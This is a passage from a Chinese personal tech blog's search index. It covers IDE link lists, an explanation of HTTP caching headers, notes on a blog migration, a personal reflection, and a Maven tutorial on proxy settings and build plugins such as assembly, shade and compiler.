<p><a href="http://url.cn/56baDcL" target="_blank" rel="noopener">高效的编码：我的VS Code设置</a></p>
]]></content>
      <categories>
        <category>编辑器</category>
      </categories>
      <tags>
        <tag>vscode</tag>
      </tags>
  </entry>
  <entry>
    <title>编辑器-IDEA</title>
    <url>/%E7%BC%96%E8%BE%91%E5%99%A8-IDEA/</url>
    <content><![CDATA[<h2 id="pycharm"><a href="#pycharm" class="headerlink" title="pycharm"></a>pycharm</h2><h3 id="Pycharm专业版配置远程服务器并自动同步代码"><a href="#Pycharm专业版配置远程服务器并自动同步代码" class="headerlink" title="Pycharm专业版配置远程服务器并自动同步代码"></a>Pycharm专业版配置远程服务器并自动同步代码</h3><p><img data-src="http://tuchuang.xchcloud.cn/blog/20200301/gIWLLj155T8y.png?imageslim" alt="mark"></p>
<p><a href="https://blog.csdn.net/wz22881916/article/details/82670969" target="_blank" rel="noopener">转载链接</a></p>
<p><a href="http://url.cn/509eCpa" target="_blank" rel="noopener">PyCharm 技巧</a><br><a id="more"></a></p>
<p>## </p>
<h3 id="在-IntelliJ-IDEA-中使用-Git"><a href="#在-IntelliJ-IDEA-中使用-Git" class="headerlink" title="在 IntelliJ IDEA 中使用 Git"></a>在 IntelliJ IDEA 中使用 Git</h3><p><a href="http://url.cn/5SDWTQN" target="_blank" rel="noopener">IDEA插件</a></p>
<p><img data-src="http://tuchuang.xchcloud.cn/blog/20200303/ccSmduVGjDDa.png?imageslim" alt="mark"></p>
<p><a href="http://url.cn/5poXc6P" target="_blank" rel="noopener">IntelliJ IDEA 高级调试技巧</a><br><a href="http://url.cn/5NYIno8" target="_blank" rel="noopener">有史以来最全的 IntelliJ IDEA 配置图解</a><br><a href="http://url.cn/5oI95yW" target="_blank" rel="noopener">有史以来最全的 IntelliJ IDEA 调试详解</a><br><a href="http://url.cn/5gbJ9NG" target="_blank" rel="noopener">IntelliJ IDEA 快捷键 Windows 版本</a></p>
<p><a href="https://www.hutool.cn/" target="_blank" rel="noopener">hutool</a></p>
<p><a href="http://url.cn/5PpHBiT" target="_blank" rel="noopener">EasyCode</a></p>
]]></content>
      <categories>
        <category>IDEA</category>
      </categories>
      <tags>
        <tag>编辑器</tag>
        <tag>pycharm</tag>
        <tag>IntelliJ</tag>
      </tags>
  </entry>
  <entry>
    <title>编辑器-vim</title>
    <url>/%E7%BC%96%E8%BE%91%E5%99%A8-vim/</url>
    <content><![CDATA[<p><a href="http://url.cn/5MlApgK" target="_blank" rel="noopener">Centos7如何编译安装vim8</a><br><a id="more"></a></p>
]]></content>
  </entry>
  <entry>
    <title>网络协议-HTTP缓存</title>
    <url>/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE-HTTP%E7%BC%93%E5%AD%98/</url>
    <content><![CDATA[<h2 id="什么是-HTTP-缓存"><a href="#什么是-HTTP-缓存" class="headerlink" title="什么是 HTTP 缓存"></a>什么是 HTTP 缓存</h2><p>HTTP 缓存可以说是HTTP性能优化中简单高效的一种优化方式了，缓存是一种保存资源副本并在下次请求时直接使用该副本的技术，当 web 缓存发现请求的资源已经被存储，它会拦截请求，返回该资源的拷贝，而不会去源服务器重新下载。</p>
<p>简单说 - 浏览器发送请求 - 第一次接收后保存本地一份 - 第二次请求 - 先找本地，命中且未失效则读取缓存。</p>
<p><img data-src="http://tuchuang.xchcloud.cn/blog/20200325/sYTtojOKN908.png" alt="mark"></p>
<p><img data-src="http://tuchuang.xchcloud.cn/blog/20200325/Fo8k5Y7I0fbM.png" alt="mark"><br><a id="more"></a></p>
<h3 id="缓存策略"><a href="#缓存策略" class="headerlink" title="缓存策略"></a>缓存策略</h3><p>在阐述HTTP不同缓存策略之前，我们需要知道用户刷新/访问行为 的手段分成三类：</p>
<pre><code>在URI输入栏中输入然后回车/通过书签访问

F5/点击工具栏中的刷新按钮/右键菜单重新加载

Ctl+F5 （完全不使用HTTP缓存）
</code></pre><p>HTTP 缓存主要是通过请求和响应报文头中的对应 Header 信息，来控制缓存的策略。<br>响应头中相关字段为：</p>
<pre><code>Expires
Cache-Control
Last-Modified
Etag
</code></pre><ul>
<li>Expires：强制缓存</li>
</ul>
<p>Expires 是 HTTP1.0 的产物了，现在默认浏览器均默认使用 HTTP 1.1，所以它的作用基本忽略。但是很多网站还是对它做了兼容。它的值为服务端返回的到期时间，即下一次请求时，请求时间小于服务端返回的到期时间，直接使用缓存数据。<br>但有一个问题是到期时间是由服务端生成的，如果客户端时间跟服务器时间不一致，这就会导致缓存命中的误差。</p>
<p>在 HTTP 1.1 的版本，Expires 被 Cache-Control 替代。</p>
<ul>
<li>Cache-Control：强制缓存</li>
</ul>
<p>Cache-Control 是最重要的规则。常见的取值有 private、public、no-cache、max-age，no-store，默认为 private。</p>
<pre><code>1) max-age：用来设置资源（representations）可以被缓存多长时间，单位为秒；
2) s-maxage：和 max-age 是一样的，不过它只针对代理服务器缓存而言；
3) public：指示响应可被任何缓存区缓存；
4) private：只能针对个人用户，而不能被代理服务器缓存；
5) no-cache：强制客户端直接向服务器发送请求,也就是说每次请求都必须向服务器发送。服务器接收到请求，然后判断资源是否变更，是则返回新内容，否则返回304，未变更。这个很容易让人产生误解，使人误以为是响应不被缓存。实际上Cache-Control:  no-cache是会被缓存的，只不过每次在向客户端（浏览器）提供响应数据时，缓存都要向服务器评估缓存响应的有效性。
6) no-store：禁止一切缓存（这个才是响应不被缓存的意思）。
</code></pre><p><img data-src="http://tuchuang.xchcloud.cn/blog/20200325/binVl5SPbXSz.png" alt="mark"></p>
<ul>
<li>Last-Modified / If-Modified-Since 对比缓存</li>
</ul>
<p>服务器响应请求时，会告诉浏览器一个告诉浏览器资源的最后修改时间：Last-Modified，浏览器之后再请求的时候，会带上一个头：If-Modified-Since，这个值就是服务器上一次给的 Last-Modified 的时间，服务器会比对资源当前最后的修改时间，如果大于If-Modified-Since，则说明资源修改过了，浏览器不能再使用缓存，否则浏览器可以继续使用缓存，并返回304状态码。</p>
<ul>
<li>Etag  /  If-None-Match（优先级高于Last-Modified  /  If-Modified-Since）对比缓存</li>
</ul>
<p>服务器响应请求时，通过Etag头部告诉浏览器当前资源在服务器的唯一标识（生成规则由服务器决定），浏览器再次请求时，就会带上一个头If-None-Match，这个值就是服务器上一次给的Etag的值，服务器比对一下资源当前的Etag是否跟If-None-Match一致，不一致则说明资源修改过了，浏览器不能再使用缓存，否则浏览器可以继续使用缓存，并返回304状态码。</p>
<p>HTTP缓存的类型很多，根据是否需要重新向服务器发起请求来分类包括两种：强制缓存和对比缓存</p>
<h4 id="强制缓存"><a href="#强制缓存" class="headerlink" title="强制缓存"></a>强制缓存</h4><p><img data-src="http://tuchuang.xchcloud.cn/blog/20200325/pVsr4GAtdaN4.png" alt="mark"></p>
<h4 id="对比缓存"><a href="#对比缓存" class="headerlink" title="对比缓存"></a>对比缓存</h4><p><img data-src="http://tuchuang.xchcloud.cn/blog/20200325/kWi718lJEUVT.png" alt="mark"></p>
]]></content>
      <categories>
        <category>网络协议</category>
      </categories>
      <tags>
        <tag>网络协议</tag>
        <tag>HTTP缓存</tag>
      </tags>
  </entry>
  <entry>
    <title>苏州之行</title>
    <url>/%E8%8B%8F%E5%B7%9E%E4%B9%8B%E8%A1%8C/</url>
    <content><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">请输入访问密匙</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
      <categories>
        <category>思考</category>
      </categories>
      <tags>
        <tag>思考</tag>
      </tags>
  </entry>
  <entry>
    <title>记录一次博客迁移</title>
    <url>/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%8D%9A%E5%AE%A2%E8%BF%81%E7%A7%BB/</url>
    <content><![CDATA[<p>之前的博客用的Wordpress，PHP语言写的，感觉功能挺完善的，但是吧，在渣渣主机上运行感觉越来越臃肿，然后就抽空尝试了下Hexo，发现真是用起来舒服，简洁、大方！</p>
<p>这次就记录下数据迁移，打算把之前的wp内文章迁移到Hexo，但是呢很快发现有点行不通，首先就是文章配图问题，不简单哦。</p>
<p>参考链接：<br>wordpress迁移到hexo的不完全填坑指南(2018)：<br><a href="http://blog.mallol.cn/2018/ffde19de.html" target="_blank" rel="noopener">http://blog.mallol.cn/2018/ffde19de.html</a></p>
<p>然后打算把这个事情先放一放，打算呢抽空学学爬虫，利用python将数据爬下来然后继续利用python将数据上传到简书，解决图片（简书就是我的图床）问题，简书就是makedown语法直接转到Hexo，不转也行~~<br><a id="more"></a><br>有机会了解下Node.js，小白懵逼中~~</p>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次思考</title>
    <url>/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%80%9D%E8%80%83/</url>
    <content><![CDATA[<h4 id="说两个点："><a href="#说两个点：" class="headerlink" title="说两个点："></a>说两个点：</h4><h5 id="1、囤书"><a href="#1、囤书" class="headerlink" title="1、囤书"></a>1、囤书</h5><p>昨天收到了stormzhang的亲笔签名书，附上一张照片~<img data-src="https://upload-images.jianshu.io/upload_images/6407592-8031607bade6084d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="干就得了.png"><br>拿书的时候真的挺兴奋的，但是呢，拿在手里感觉真的太薄了吧~这本书当当售价60+呢，怎么这么薄呢？看了下内容，头呢么一点点的后悔，可能短时间内看不懂消化不掉，后悔为什么没有选择码农翻身，这都没什么，想看就去找电子版呗！</p>
<p>真香警告，电子版没有找到哦，不过阴差阳错发现了一伙卖电子书的家伙，他们专门制作电子书，每周都会购买新书进行扫描制作PDF，从这位老兄手里的书单挑选了几本网络上没有的，均价5元吧~还是能接受的，现在我都有着一种冲动也加入卖书的队伍中，有套理论是花钱是为了赚钱，风险也是存在的~以及自我估计，你有没有精力有没有时间去搞这个！</p>
<p>简单在心里估计了下，这学期为止，囤的电子书已经有几个G了，然后趁着一些促销活动也买了300左右的书，有时间看嘛？无奈，以目前的情况来看，以后还会继续囤书~<br><a id="more"></a><br><img data-src="https://upload-images.jianshu.io/upload_images/6407592-f020ce817202dccd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
<p>书是有了，如果不去看的话，终究还是不会是自己的~</p>
<h6 id="计划单"><a href="#计划单" class="headerlink" title="计划单"></a>计划单</h6><p>1、python<br>2、码农翻身<br>3、算法<br>4、产品经理<br>5、Docker<br>6、深度学习<br>（前三很重要）</p>
<h5 id="2、思考"><a href="#2、思考" class="headerlink" title="2、思考"></a>2、思考</h5><p>不自信和无法认识自我的表现可能会让自己一直处于失望当中。</p>
<p>总是去饰演那些与本性相违背的角色，所以才会产生灰心丧气的感觉，虽然这是现代社会的生存方式，但也让自己沦为了“工作”的奴隶。</p>
<p>每个人都是独一无二的，都是不可代替的，其实只要去了解自己，会发现生活并不是无趣的存在。毕竟，这个世界还有很多美好的事物等着我们去发现和探寻。</p>
<p>生命的意义在于你自己，如果你一直失望，生活中也没有你所爱之人，那么生活真的没意思了。</p>
]]></content>
      <categories>
        <category>思考</category>
      </categories>
      <tags>
        <tag>思考</tag>
      </tags>
  </entry>
  <entry>
    <title>重学JAVA</title>
    <url>/%E9%87%8D%E5%AD%A6JAVA/</url>
    <content><![CDATA[<h2 id="基础入门级知识框架"><a href="#基础入门级知识框架" class="headerlink" title="基础入门级知识框架"></a>基础入门级知识框架</h2><p><img data-src="http://tuchuang.xchcloud.cn/1571756729730.jpg" alt></p>
<h2 id="基础回忆手记"><a href="#基础回忆手记" class="headerlink" title="基础回忆手记"></a>基础回忆手记</h2><p><img data-src="http://tuchuang.xchcloud.cn/1571756712700.jpg" alt><br><a id="more"></a></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>2021-java-maven</title>
    <url>/2021-java-maven/</url>
    <content><![CDATA[<h2 id="Maven代理设置"><a href="#Maven代理设置" class="headerlink" title="Maven代理设置"></a>Maven代理设置</h2><a id="more"></a>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;proxy&gt;</span><br><span class="line">      &lt;id&gt;optional&lt;/id&gt;</span><br><span class="line">      &lt;active&gt;true&lt;/active&gt;</span><br><span class="line">      &lt;protocol&gt;http&lt;/protocol&gt;</span><br><span class="line">      &lt;username&gt;proxyuser&lt;/username&gt;</span><br><span class="line">      &lt;password&gt;proxypass&lt;/password&gt;</span><br><span class="line">      &lt;host&gt;proxy.host.net&lt;/host&gt;</span><br><span class="line">      &lt;port&gt;80&lt;/port&gt;</span><br><span class="line">      &lt;nonProxyHosts&gt;local.net|some.host.com&lt;/nonProxyHosts&gt;</span><br><span class="line">&lt;/proxy&gt;</span><br><span class="line"></span><br><span class="line">&lt;proxy&gt;</span><br><span class="line">      &lt;id&gt;ss&lt;/id&gt;</span><br><span class="line">      &lt;active&gt;true&lt;/active&gt;</span><br><span class="line">      &lt;protocol&gt;socks5&lt;/protocol&gt;</span><br><span class="line">      &lt;username&gt;&lt;/username&gt;</span><br><span class="line">      &lt;password&gt;&lt;/password&gt;</span><br><span class="line">      &lt;host&gt;127.0.0.1&lt;/host&gt;</span><br><span class="line">      &lt;port&gt;8093&lt;/port&gt;</span><br><span class="line">      &lt;nonProxyHosts&gt;127.0.0.1&lt;/nonProxyHosts&gt;</span><br><span class="line"> &lt;/proxy&gt;</span><br><span class="line"></span><br><span class="line">id：代理的名称（随便设，XYZ也行）</span><br><span class="line">active：表示该代理是否激活</span><br><span class="line">protocol：代理协议，这个不用改  (socks5/http)</span><br><span class="line">username：当代理需要认证时的用户名</span><br><span class="line">password：当代理需要认证时的密码</span><br><span class="line">host：代理的IP地址</span><br><span class="line">port：代理的端口号</span><br><span class="line">nonProxyHost：指定不需要使用代理的主机，可不设置。如果有多个，用 | 分隔</span><br><span class="line">（P.S. 如果代理不需要用户认证，username 和 password 两个节点可注释掉）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">命令行 export MAVEN_OPTS=&quot;-DsocksProxyHost=127.0.0.1 -DsocksProxyPort=1080&quot;</span><br></pre></td></tr></table></figure>
<h2 id="maven插件"><a href="#maven插件" class="headerlink" title="maven插件"></a>maven插件</h2><h3 id="插件-plugings"><a href="#插件-plugings" class="headerlink" title="插件 plugings"></a>插件 plugings</h3><p>什么是插件？ maven提供的功能,用来执行清理、编译、测试、报告、打包的程序<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">①. clean插件maven-clean-plugin:2.5</span><br><span class="line">clean阶段是独立的一个阶段,功能就是清除工程目前下的target目录</span><br><span class="line"></span><br><span class="line">②. resources插件maven-resources-plugin:2.6</span><br><span class="line">resource插件的功能就是把项目需要的配置文件拷贝到指定的目当,默认是拷贝src\main\resources目录下的件到classes目录下</span><br><span class="line"></span><br><span class="line">③. compile插件maven-compiler-plugin</span><br><span class="line">compile插件执行时先调用resouces插件,功能就是把src\mainjava源码编译成字节码生成class文件,并把编译好的class文件输出到target\classes目录下</span><br><span class="line"></span><br><span class="line">④. test测试插件</span><br><span class="line">单元测试所用的compile和resources插件和主代码是相同的,但执行的目标不行,目标testCompile和testResources是把src\test\java下的代码编译成字节码输出到target\test-classes,同时把src\test\resources下的配置文件拷贝到target\test-classes</span><br><span class="line"></span><br><span class="line">⑤. package打包插件maven-jar-plugin</span><br><span class="line">这个插件是把class文件、配置文件打成一个jar(war或其它格式)包</span><br><span class="line"></span><br><span class="line">⑥. deploy发布插件maven-install-plugin</span><br><span class="line">发布插件的功能就是把构建好的artifact部署到本地仓库,还有一个deploy插件是将构建好的artifact部署到远程仓库</span><br></pre></td></tr></table></figure></p>
<h3 id="使用插件"><a href="#使用插件" class="headerlink" title="使用插件"></a>使用插件</h3><p>maven实际上一个插件执行框架，所有的工作实际上都是通过插件完成，一个插件通常提供若干目标（goal），通过如下形式的命令执行插件目标：<br><code>mvn [plugin name]:[goal name]</code></p>
<p>例如可以通过编译插件compiler去编译目标，命令如下：<br><code>mvn compiler:compile</code></p>
<p><img data-src="http://tuchuang.xchcloud.cn/20210117205350.png" alt="20210117205350"></p>
<h4 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h4><p>maven是一种基于构建生命周期(build lifecycle)的项目构建工具, 也就是说一个项目的构建和发布是要经历几个过程的，目前主要包含三个过程：<br>clean<br>default<br>site<br><img data-src="http://tuchuang.xchcloud.cn/20210117210308.png" alt="20210117210308"></p>
<p>使用过mvn的就会发现，一个phase对应一个mvn的命令，比如当执行mvn compile命令时就是执行该phase之前的所有phase。<br>但是前言中说过mvn是通过插件来执行任务的，当执行mvn compile这个phase时，实际上是执行绑定在compile这个phase上的插件目标，由于compile这个phase默认绑定了compiler: compile（compiler插件的compile目标）,因此执行mvn compile等于去执行了mvn compiler:compile</p>
<p>再例如：执行mvn package 实际上执行了插件mvn jar:jar(注意此处假设pom里配置了<packaging>jar<package>), 因为package这个phase默认绑定了jar:jar这个插件目标。</package></packaging></p>
<h4 id="插件配置"><a href="#插件配置" class="headerlink" title="插件配置"></a>插件配置</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot;</span><br><span class="line">  xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">  xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0</span><br><span class="line">                      https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;</span><br><span class="line">  &lt;build&gt;</span><br><span class="line">    ...</span><br><span class="line">    &lt;plugins&gt;</span><br><span class="line">      &lt;plugin&gt;</span><br><span class="line">        &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;maven-jar-plugin&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;2.6&lt;/version&gt;</span><br><span class="line">        &lt;extensions&gt;false&lt;/extensions&gt;</span><br><span class="line">        &lt;inherited&gt;true&lt;/inherited&gt;</span><br><span class="line">        &lt;configuration&gt;</span><br><span class="line">          &lt;classifier&gt;test&lt;/classifier&gt;</span><br><span class="line">        &lt;/configuration&gt;</span><br><span class="line">        &lt;dependencies&gt;...&lt;/dependencies&gt;</span><br><span class="line">        &lt;executions&gt;...&lt;/executions&gt;</span><br><span class="line">      &lt;/plugin&gt;</span><br><span class="line">    &lt;/plugins&gt;</span><br><span class="line">  &lt;/build&gt;</span><br><span class="line">&lt;/project&gt;</span><br><span class="line"></span><br><span class="line">一个&lt;plugin&gt;&lt;/plugin&gt;表示一个插件， &lt;groupId&gt;,&lt;artifactId&gt;,&lt;version&gt;都是引入必要配置。插件本质上托管在mvn仓库里。</span><br><span class="line"></span><br><span class="line">&lt;inherited&gt;表示是否当前pom的子pom中继承这个插件配置，true表示子pom继承父pom这个插件配置，那么你就可以在子pom上通过mvn命令使用这个插件</span><br><span class="line"></span><br><span class="line">&lt;configuration&gt;中包含了插件类实例化时用于初始化类成员信息</span><br><span class="line"></span><br><span class="line">&lt;dependencies&gt;, 插件自身也会依赖外部包，&lt;dependencies&gt;中可以为插件指定特定的依赖包， 引入方式如下:</span><br><span class="line"></span><br><span class="line">&lt;executions&gt;, 一个插件可能包含多个goal，&lt;executions&gt;中可以单独为某个goal指定配置，以及将goal绑定到某个phase。</span><br><span class="line"></span><br><span class="line">executions包含的elements如下：</span><br><span class="line">&lt;executions&gt;</span><br><span class="line">       &lt;execution&gt;</span><br><span class="line">         &lt;!--需要在&lt;executions&gt;里面唯一的id--&gt;</span><br><span class="line">         &lt;id&gt;&lt;/id&gt;</span><br><span class="line">          &lt;!--列出需要特定去配置的所有goal--&gt;</span><br><span class="line">         &lt;goals&gt;</span><br><span class="line">           &lt;goal&gt;run&lt;/goal&gt;</span><br><span class="line">         &lt;/goals&gt;</span><br><span class="line">         &lt;!--将这些goal绑定到phase--&gt;</span><br><span class="line">         &lt;phase&gt;verify&lt;/phase&gt;</span><br><span class="line">         &lt;!--指定子pom是否继承这些配置--&gt;</span><br><span class="line">         &lt;inherited&gt;false&lt;/inherited&gt;</span><br><span class="line">         &lt;configuration&gt;</span><br><span class="line">           &lt;!--这里指定配置--&gt;</span><br><span class="line">         &lt;/configuration&gt;</span><br><span class="line">       &lt;/execution&gt;</span><br><span class="line">       &lt;execution&gt;</span><br><span class="line">         ...</span><br><span class="line">       &lt;/execution&gt;</span><br><span class="line">       ...</span><br><span class="line">&lt;/executions&gt;</span><br></pre></td></tr></table></figure>
<p>比如下面就是一个几乎所有人都会用到的插件配置，compiler：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;plugin&gt;</span><br><span class="line">       &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;</span><br><span class="line">       &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt;</span><br><span class="line">       &lt;version&gt;3.5.1&lt;/version&gt;  &lt;!--指定compiler插件版本信息--&gt;</span><br><span class="line">       &lt;configuration&gt;</span><br><span class="line">           &lt;!--插件实例化参数，这个参数是设置javac -source的值--&gt;</span><br><span class="line">          &lt;source&gt;1.7&lt;/source&gt;  </span><br><span class="line">           &lt;!--插件实例化参数，这个参数是设置javac -target的值--&gt;</span><br><span class="line">          &lt;target&gt;1.7&lt;/target&gt;</span><br><span class="line">       &lt;/configuration&gt;</span><br><span class="line">&lt;/plugin&gt;</span><br><span class="line"></span><br><span class="line">这里没有指定&lt;executions&gt;，因为compiler插件的目标compile默认被绑定到compile这个phase上了，</span><br><span class="line">目标testCompile被绑定到了test-compile这个phase上了。</span><br><span class="line">当然你可以显式指定，加入如下配置即可：</span><br><span class="line">&lt;executions&gt;</span><br><span class="line">        &lt;execution&gt;</span><br><span class="line">              &lt;id&gt;compile&lt;/id&gt;</span><br><span class="line">              &lt;goals&gt;</span><br><span class="line">                  &lt;goal&gt;compile&lt;/goal&gt;</span><br><span class="line">             &lt;/goals&gt;</span><br><span class="line">             &lt;phase&gt;compile&lt;/phase&gt;</span><br><span class="line">        &lt;/execution&gt;</span><br><span class="line">        &lt;execution&gt;</span><br><span class="line">             &lt;id&gt;testCompile&lt;/id&gt;</span><br><span class="line">             &lt;phase&gt;test-compile&lt;/phase&gt;</span><br><span class="line">             &lt;goals&gt;</span><br><span class="line">                 &lt;goal&gt;testCompile&lt;/goal&gt;</span><br><span class="line">             &lt;/goals&gt;</span><br><span class="line">       &lt;/execution&gt;</span><br><span class="line"> &lt;/executions&gt;</span><br></pre></td></tr></table></figure></p>
<h3 id="scala插件scala-maven-plugin"><a href="#scala插件scala-maven-plugin" class="headerlink" title="scala插件scala-maven-plugin"></a>scala插件scala-maven-plugin</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;plugins&gt;</span><br><span class="line">        &lt;plugin&gt;</span><br><span class="line">            &lt;groupId&gt;org.scala-tools&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;maven-scala-plugin&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;2.15.2&lt;/version&gt;</span><br><span class="line">            &lt;executions&gt;</span><br><span class="line">                &lt;execution&gt;</span><br><span class="line">                    &lt;id&gt;scala-compile&lt;/id&gt;</span><br><span class="line">                    &lt;goals&gt;</span><br><span class="line">                        &lt;goal&gt;compile&lt;/goal&gt;</span><br><span class="line">                    &lt;/goals&gt;</span><br><span class="line">                    &lt;configuration&gt;</span><br><span class="line">                        &lt;!--includes是一个数组，包含要编译的code--&gt;</span><br><span class="line">                        &lt;includes&gt;</span><br><span class="line">                            &lt;include&gt;**/*.scala&lt;/include&gt;</span><br><span class="line">                        &lt;/includes&gt;</span><br><span class="line">                    &lt;/configuration&gt;</span><br><span class="line">                &lt;/execution&gt;</span><br><span class="line">                &lt;execution&gt;</span><br><span class="line">                    &lt;id&gt;scala-test-compile&lt;/id&gt;</span><br><span class="line">                    &lt;goals&gt;</span><br><span class="line">                        &lt;goal&gt;testCompile&lt;/goal&gt;</span><br><span class="line">                    &lt;/goals&gt;</span><br><span class="line">                &lt;/execution&gt;</span><br><span class="line">            &lt;/executions&gt;</span><br><span class="line">        &lt;/plugin&gt;</span><br><span class="line">&lt;/plugins&gt;</span><br></pre></td></tr></table></figure>
<p>比较常用的两个goal：<br>compile 编译 scala code<br>testCompile 编译 test code</p>
<p>运行命令行：<br><code>mvn clean scala:compile compile</code></p>
<h3 id="项目打包插件"><a href="#项目打包插件" class="headerlink" title="项目打包插件"></a>项目打包插件</h3><h4 id="maven-assembly-plugin"><a href="#maven-assembly-plugin" class="headerlink" title="maven-assembly-plugin"></a>maven-assembly-plugin</h4><p>可用来打可发布可独立运行的jar包， 也就是说它可以将项目中所有依赖打进包。<br><code>mvn assembly:single</code><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;plugins&gt;</span><br><span class="line">  &lt;plugin&gt;</span><br><span class="line">    &lt;artifactId&gt;maven-assembly-plugin&lt;/artifactId&gt;</span><br><span class="line">    &lt;configuration&gt;</span><br><span class="line">        &lt;!--这个插件会输出多个包，原始包不包含任何依赖，</span><br><span class="line">        以及一个或者多个包含所有依赖的包，这些包以&lt;descriptorRef&gt;中的value为后缀。 这里可以配置n个&lt;descriptorRef&gt;，就会多生成n个包含所有依赖的包--&gt;</span><br><span class="line">        &lt;descriptorRefs&gt;</span><br><span class="line">            &lt;descriptorRef&gt;jar-with-dependencies&lt;/descriptorRef&gt;</span><br><span class="line">        &lt;/descriptorRefs&gt;</span><br><span class="line">    &lt;/configuration&gt;</span><br><span class="line">    &lt;executions&gt;</span><br><span class="line">        &lt;execution&gt;</span><br><span class="line">            &lt;!--这里将single这个goal绑定在package这个phase上--&gt;</span><br><span class="line">            &lt;id&gt;make-assembly&lt;/id&gt;</span><br><span class="line">            &lt;phase&gt;package&lt;/phase&gt;</span><br><span class="line">            &lt;goals&gt;</span><br><span class="line">                &lt;goal&gt;single&lt;/goal&gt;</span><br><span class="line">            &lt;/goals&gt;</span><br><span class="line">            &lt;!--&lt;configuration&gt;--&gt;</span><br><span class="line">                &lt;!--&lt;archive&gt;--&gt;</span><br><span class="line">                    &lt;!--&lt;manifest&gt;--&gt;</span><br><span class="line">                        &lt;!--&lt;mainClass&gt;me.test.sparktest.WordCount&lt;/mainClass&gt;--&gt;</span><br><span class="line">                    &lt;!--&lt;/manifest&gt;--&gt;</span><br><span class="line">                &lt;!--&lt;/archive&gt;--&gt;</span><br><span class="line">            &lt;!--&lt;/configuration&gt;--&gt;</span><br><span class="line">        &lt;/execution&gt;</span><br><span class="line">    &lt;/executions&gt;</span><br><span class="line">  &lt;/plugin&gt;</span><br><span class="line">&lt;/plugins&gt;</span><br><span class="line"></span><br><span class="line">去掉上面配置中&lt;configuration&gt;&lt;/configuration&gt;的注释，&lt;mainClass&gt;这个元素指定了MANIFEST.MF中的Main-Class。</span><br></pre></td></tr></table></figure></p>
<h4 id="maven-shade-plugin"><a href="#maven-shade-plugin" class="headerlink" title="maven-shade-plugin"></a>maven-shade-plugin</h4><p>和assembly插件一样它也可以将所有依赖打到包中，同时也可以打可执行的jar包。<br>运行命令<code>mvn package</code>（将shade绑定在package这个phase上，不然会出错）<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;plugin&gt;</span><br><span class="line">  &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;maven-shade-plugin&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;3.1.0&lt;/version&gt;</span><br><span class="line">  &lt;configuration&gt;</span><br><span class="line">    &lt;!-- put your configurations here --&gt;</span><br><span class="line">  &lt;/configuration&gt;</span><br><span class="line">  &lt;executions&gt;</span><br><span class="line">    &lt;execution&gt;</span><br><span class="line">      &lt;!--将shade 这个goal绑定到package这个phase上--&gt;</span><br><span class="line">      &lt;phase&gt;package&lt;/phase&gt;</span><br><span class="line">      &lt;goals&gt;</span><br><span class="line">        &lt;goal&gt;shade&lt;/goal&gt;</span><br><span class="line">      &lt;/goals&gt;</span><br><span class="line">    &lt;/execution&gt;</span><br><span class="line">  &lt;/executions&gt;</span><br><span class="line">&lt;/plugin&gt;</span><br></pre></td></tr></table></figure></p>
<h3 id="spring-boot-插件"><a href="#spring-boot-插件" class="headerlink" title="spring boot 插件"></a>spring boot 插件</h3><p>Spring Boot的 maven 插件能够以 maven 命令行的方式提供对 spring boot 应用打包和运行的支持。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;plugins&gt;</span><br><span class="line">  &lt;plugin&gt;</span><br><span class="line">      &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;1.5.4.RELEASE&lt;/version&gt;</span><br><span class="line">      &lt;configuration&gt;</span><br><span class="line">        &lt;layout&gt;WAR&lt;/layout&gt;</span><br><span class="line">      &lt;/configuration&gt;</span><br><span class="line">      &lt;executions&gt;</span><br><span class="line">        &lt;execution&gt;</span><br><span class="line">          &lt;goals&gt;</span><br><span class="line">            